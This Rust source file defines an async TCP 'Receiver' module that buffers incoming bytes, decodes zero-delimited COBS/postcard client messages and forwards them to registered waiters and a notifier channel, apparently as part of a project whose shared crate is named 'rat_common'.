use std::collections::LinkedList;
use std::io;
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use log::warn;
use rat_common::messages::ClientMessage;
use rat_common::module::{Module, ModuleState};
use rat_common::utils::acquire_free_mutex;
use tokio::io::AsyncReadExt;
use tokio::net::tcp::OwnedReadHalf;
use tokio::sync::{Mutex, mpsc, oneshot};

use crate::message::InternalMessage;

type _Predicate = dyn Fn(&ClientMessage) -> bool + Send + Sync + 'static;

pub struct Receiver {
    _peer: SocketAddr,
    _tcp: Mutex<OwnedReadHalf>,
    _current_buffer: Mutex<Vec<u8>>,
    _notifier: mpsc::Sender<InternalMessage>,
    _custom_waits: Mutex<LinkedList<(Box<_Predicate>, oneshot::Sender<ClientMessage>)>>,
    _state: Arc<ModuleState>,
}

impl Receiver {
    pub fn new(
        peer: SocketAddr,
        tcp: OwnedReadHalf,
        notifier: mpsc::Sender<InternalMessage>,
    ) -> Self {
        Self {
            _peer: peer,
            _tcp: Mutex::new(tcp),
            _current_buffer: Mutex::new(vec![]),
            _notifier: notifier,
            _custom_waits: Mutex::new(LinkedList::new()),
            _state: Arc::new(ModuleState::new()),
        }
    }

    pub async fn wait_for<F: Fn(&ClientMessage) -> bool + Send + Sync + 'static>(
        &self,
        predicate: F,
    ) -> Option<ClientMessage> {
        let (send, receive) = oneshot::channel();

        let mut waiters = self._custom_waits.lock().await;
        waiters.push_back((Box::new(predicate), send));
        drop(waiters);

        receive.await.ok()
    }
}

#[async_trait]
impl Module for Receiver {
    type EventType = io::Result<Vec<u8>>;

    fn name(&self) -> &str {
        "Receiver"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let mut tcp = acquire_free_mutex(&self._tcp);
        let mut temp = [0u8; 512];

        let n = tcp.read(&mut temp).await?;
        Ok(temp[..n].to_vec())
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let new_data = match event {
            Ok(d) => d,
            Err(e) => {
                // recv error, most likely the connection was closed by peer
                self.stop();
                return Err(e.into());
            }
        };
        let mut buffer = acquire_free_mutex(&self._current_buffer);

        for byte in new_data {
            buffer.push(byte);
            if byte == 0 {
                let decoded = postcard::from_bytes_cobs::<ClientMessage>(&mut buffer);
                buffer.clear();
                match decoded {
                    Ok(message) => {
                        let mut waiters = self._custom_waits.lock().await;
                        for (_, sender) in waiters.extract_if(|(pred, _)| pred(&message)) {
                            let _ = sender.send(message.clone());
                        }
                        drop(waiters);

                        self._notifier
                            .send(InternalMessage::Message {
                                peer: self._peer,
                                data: message,
                            })
                            .await?;
                    }
                    Err(e) => warn!("Failed to deserialize message from {e}: {}", self._peer),
                }
            }
        }

        Ok(())
    }
}
